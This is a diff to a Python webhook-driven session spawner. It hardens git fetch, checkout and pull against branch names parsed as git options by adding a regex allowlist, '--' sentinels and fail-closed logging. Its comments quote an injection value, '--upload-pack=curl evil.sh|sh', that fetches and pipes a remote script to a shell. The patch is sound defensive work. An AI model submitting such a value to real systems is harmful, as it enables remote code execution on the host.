@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import os
+import re
 import subprocess
 import sys
 import threading
@@ -22,6 +23,29 @@ BOT_COMMENT_MARKER = "<!-- xcagent -->"
 
 LOGS_DIR = Path(__file__).resolve().parents[2] / "data" / "logs" / "l3"
 LOGS_DIR.mkdir(parents=True, exist_ok=True)
+
+# Safe branch name pattern — mirrors git's own restrictions (no leading
+# dash, no whitespace/control chars, no shell metacharacters, no '..').
+# A leading '-' would let webhook-controlled refs be parsed as git
+# options, historically a full RCE vector (CVE-2017-1000117 family,
+# e.g. `git fetch origin --upload-pack=<cmd>`). Branch names flow in
+# from untrusted webhook payloads (GitHub and ADO) so L3 must validate
+# them before they become subprocess argv elements.
+_SAFE_BRANCH_RE = re.compile(r"[A-Za-z0-9_./][A-Za-z0-9_./+-]*")
+
+
+def _is_safe_branch(branch: str) -> bool:
+    """Return True if ``branch`` is safe to pass to git subprocess calls.
+
+    Uses ``fullmatch`` (not ``match``) so a trailing newline cannot
+    slip past the anchor — Python's ``$`` in default mode matches the
+    position right before a terminating ``\\n``.
+    """
+    if not branch or len(branch) > 255:
+        return False
+    if ".." in branch:
+        return False  # `git fetch origin ..foo` refuses too, but guard anyway
+    return bool(_SAFE_BRANCH_RE.fullmatch(branch))
 
 
 class SessionSpawner:
@@ -43,6 +67,13 @@ class SessionSpawner:
         cwd = self._repo_path or os.getenv("CLIENT_REPO_PATH", "")
         if not cwd or not branch:
             return
+        # Reject webhook-controlled branches that could be parsed as
+        # git options (e.g. "--upload-pack=curl evil.sh|sh"). Without
+        # the '--' sentinel OR an allowlist check git would treat the
+        # branch as a flag. Fail closed and log.
+        if not _is_safe_branch(branch):
+            log.error("unsafe_branch_name_rejected", branch=branch[:100])
+            return
         try:
             # Verify repo identity if expected_repo provided
             if expected_repo:
@@ -59,14 +90,21 @@ class SessionSpawner:
                     )
                     return  # Do NOT operate on wrong repo
 
+            # Defense in depth: validated branch name above, AND pass
+            # '--' sentinel so git stops parsing options.
             fetch = subprocess.run(
-                ["git", "fetch", "origin", branch],
+                ["git", "fetch", "origin", "--", branch],
                 cwd=cwd, capture_output=True, text=True, timeout=30,
             )
             if fetch.returncode != 0:
                 log.error("git_fetch_failed", branch=branch, stderr=fetch.stderr[:200])
                 return
 
+            # git checkout cannot use '--' sentinel — it would make git
+            # interpret <branch> as a pathspec rather than a branch
+            # name ("error: pathspec '...' did not match"). The regex
+            # validation above is the sole defense here: unsafe
+            # branches have already been rejected.
             checkout = subprocess.run(
                 ["git", "checkout", branch],
                 cwd=cwd, capture_output=True, text=True, timeout=15,
@@ -76,7 +114,7 @@ class SessionSpawner:
                 return
 
             pull = subprocess.run(
-                ["git", "pull", "--ff-only", "origin", branch],
+                ["git", "pull", "--ff-only", "origin", "--", branch],
                 cwd=cwd, capture_output=True, text=True, timeout=30,
             )
             if pull.returncode != 0:
